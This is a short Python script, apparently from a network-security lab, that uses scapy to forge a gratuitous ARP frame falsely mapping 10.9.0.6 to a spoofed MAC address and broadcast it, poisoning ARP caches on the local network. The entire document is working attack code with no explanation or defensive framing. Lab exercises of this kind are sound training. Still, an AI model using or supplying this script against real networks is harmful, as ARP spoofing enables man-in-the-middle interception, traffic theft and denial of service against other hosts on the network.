#!/usr/bin/env python3
from scapy.all import *

IP_target = "10.9.0.5"
MAC_target = "02:42:0a:09:00:05"

IP_spoofed = "10.9.0.6"
MAC_spoofed = "02:42:0a:09:00:69"

MAC_broadcast = "ff:ff:ff:ff:ff:ff"

print("SENDING SPOOFED ARP GRATUITOUS REQUEST.....")

# Construct the Ether header
ether = Ether()

ether.dst = MAC_broadcast
ether.src = MAC_spoofed

# Construct the ARP packet
arp = ARP()
arp.psrc = IP_spoofed
arp.hwsrc = MAC_spoofed
arp.pdst = IP_spoofed
arp.hwdst = MAC_broadcast
arp.op = 2
frame = ether/arp
sendp(frame)
